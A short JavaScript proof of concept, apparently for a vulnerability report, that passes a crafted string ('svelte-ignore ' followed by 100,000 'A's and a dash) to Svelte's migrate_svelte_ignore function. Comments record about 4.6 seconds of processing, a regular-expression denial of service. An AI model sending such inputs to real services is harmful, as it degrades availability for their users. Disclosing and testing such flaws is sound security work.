import { migrate_svelte_ignore } from "./extract_svelte_ignore.js";

//Attack String :"svelte-ignore "+"A"*100000+"-"
var str = "svelte-ignore ";
for (var i = 0; i < 100000; i++) {
  str += "A";
}
str += "-";

var result = migrate_svelte_ignore(str);

// real    0m4.610s
// user    0m4.572s
// sys     0m0.010s
